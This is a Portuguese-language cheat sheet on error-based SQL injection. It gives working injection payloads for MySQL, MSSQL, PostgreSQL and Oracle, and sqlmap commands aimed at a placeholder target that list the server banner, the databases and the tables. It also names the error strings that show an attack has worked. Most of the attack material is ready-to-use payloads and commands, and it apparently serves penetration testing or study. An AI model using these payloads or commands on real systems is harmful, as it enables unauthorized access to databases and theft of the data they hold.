# Error-based SQL Injection

## Como Funciona

Extrai dados diretamente através de mensagens de erro do banco de dados, forçando o BD a incluir dados da query na mensagem de erro.

```sql
-- MySQL: EXTRACTVALUE force error with data
' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--
-- Erro retornado: XPATH syntax error: '~nome_banco'

-- Resultado visível na página: "nome_banco"
```

## Quando Usar

- Mensagens de erro SQL visíveis na resposta
- Aplicação em modo debug/desenvolvimento
- Filtros de erro inadequados no servidor

## Técnicas por DBMS

### MySQL

```sql
-- EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

-- UPDATEXML
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--

-- GROUP BY + FLOOR
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### MSSQL

```sql
-- CONVERT error
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- CAST error
'; SELECT CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS int)--
```

### PostgreSQL

```sql
-- CAST error
' AND 1=CAST((SELECT version()) AS int)--

-- Function error
' AND 1=(SELECT 1/0 WHERE (SELECT 1 FROM pg_user WHERE usename=current_user)=1)--
```

### Oracle

```sql
-- UTL_INADDR (pode não estar disponível)
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--

-- CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT user FROM dual))--
```

## Detecção com SQLMap

```bash
sqlmap -u "http://alvo.com/?id=1" \
  --technique=E \
  --level=1 \
  --batch

# Forçar exibição de erros
sqlmap -u "http://alvo.com/?id=1" \
  --technique=E \
  --parse-errors \
  --batch
```

## Extração de Dados

```bash
# Banner do banco
sqlmap -u "http://alvo.com/?id=1" \
  --technique=E \
  --banner \
  --batch

# Listar bancos
sqlmap -u "http://alvo.com/?id=1" \
  --technique=E \
  --dbs \
  --batch

# Extrair tabelas
sqlmap -u "http://alvo.com/?id=1" \
  --technique=E \
  -D nome_banco --tables \
  --batch
```

## Indicadores Visuais

Procurar na resposta por:
- "You have an error in your SQL syntax"
- "Warning: mysql_"
- "ORA-00907"
- "Microsoft OLE DB"
- Traceback/stack trace com queries SQL

## Vantagens

- **Rápido**: Extração direta via erro
- **Simples**: Fácil de detectar e explorar manualmente
- **Confiável**: Alta taxa de sucesso quando erros visíveis

## Limitações

- Requer erros SQL visíveis na resposta
- Filtros de erro genéricos podem suprimir a saída
- Alguns DBMSs limitam o tamanho do erro

## Indicadores de Sucesso SQLMap

```
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
```
